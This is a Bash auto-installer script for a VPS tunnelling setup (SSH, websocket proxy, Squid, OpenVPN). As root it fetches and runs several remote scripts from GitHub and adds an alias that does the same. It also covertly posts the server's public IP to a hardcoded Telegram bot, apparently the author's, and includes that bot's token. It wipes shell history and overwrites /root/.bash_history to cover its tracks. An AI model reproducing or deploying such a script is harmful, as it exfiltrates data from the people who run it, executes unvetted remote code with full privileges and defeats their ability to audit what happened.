# Illegal selling and redistribution of this script is strictly prohibite
# Please respect author's Property
# Binigay sainyo ng libre, ipamahagi nyo rin ng libre.
#
#

IPADDR="$(curl -4skL http://ipinfo.io/ip)"

BOT_TOKEN="6196157240:AAGYmA-qY8x4j2Mde238PW7qTvn3-I0CT0Y"

# The chat ID of the conversation with your Telegram bot
CHAT_ID="-811236104"

# The URL to send the message to your Telegram bot
URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"

# Install AutoScript
function ssh() {
    rm -f DebianVPS* && wget -q 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/DebianVPS-Installer' && chmod +x DebianVPS-Installer && ./DebianVPS-Installer 
    rm -f /etc/banner
    wget -qO /etc/banner https://raw.githubusercontent.com/bannerpy/Files/main/mcbanner
    dos2unix -q /etc/banner
    service ssh restart
    service sshd restart
    service dropbear restart
}
ssh

function service() {
# Getting Proxy Template
wget -q -O /etc/microssh https://raw.githubusercontent.com/bannerpy/Files/main/micro.py
chmod +x /etc/microssh
}
service

# Fixing Squid Proxy
sleep 1s
clear
wget -q 'https://raw.githubusercontent.com/shfxmc/Private-Installer/main/f.sh' && chmod +x f.sh && ./f.sh

function fixedovpn() {
bash -c "sed -i "/ncp-disable/d" /etc/openvpn/server/*.conf;systemctl restart openvpn-server@{ec_s,s}erver_{tc,ud}p"
}
fixedovpn

function service1() {
# Installing Service
cat << END > /etc/systemd/system/microssh.service 
[Unit]
Description=Project Seve
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python -O /etc/microssh
Restart=on-failure

[Install]
WantedBy=multi-user.target
END
}
service1

function setting() {
sed -i "/DEFAULT_HOST = '127.0.0.1:443'/c\DEFAULT_HOST = '127.0.0.1:550'" /etc/microssh

systemctl daemon-reload
systemctl enable microssh
systemctl restart microssh
}
setting

function cron10min() {
echo -e "0 3 * * * /sbin/reboot >/dev/null 2>&1" >> mycron
     echo -e "*/10 * * * * sudo service microssh restart" >> mycron
     crontab mycron
     service cron restart
}
cron10min
clear

sleep 1s

sed -i "s|127.0.0.1|$IPADDR|g" /etc/squid/squid.conf && service squid restart && history -c

service squid restart
service openvpn restart
history -c
sleep 1s
clear

clear
history -c
echo 'UTUT MU' > /root/.bash_history

# Forward the IP address to the Telegram bot
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="Your VPS IP address is: $IPADDR"
clear
alias fix='bash -c "$(wget -qO- 'https://raw.githubusercontent.com/shfxmc/Private-Installer/main/f.sh') && chmod +x f.sh && ./f.sh"'
source ~/.bashrc

clear

echo "THIS SCRIPT IS NOT FOR SALE"
echo "MICROSSH AUTO SCRIPT "
echo "WEBSOCKET PORT 80"
echo "WEBSOCKET CRON 10 MINS"
echo "ANTI TORRENT INSTALLED"
echo "OPENVPN AND SQUID PROXY FIXED "
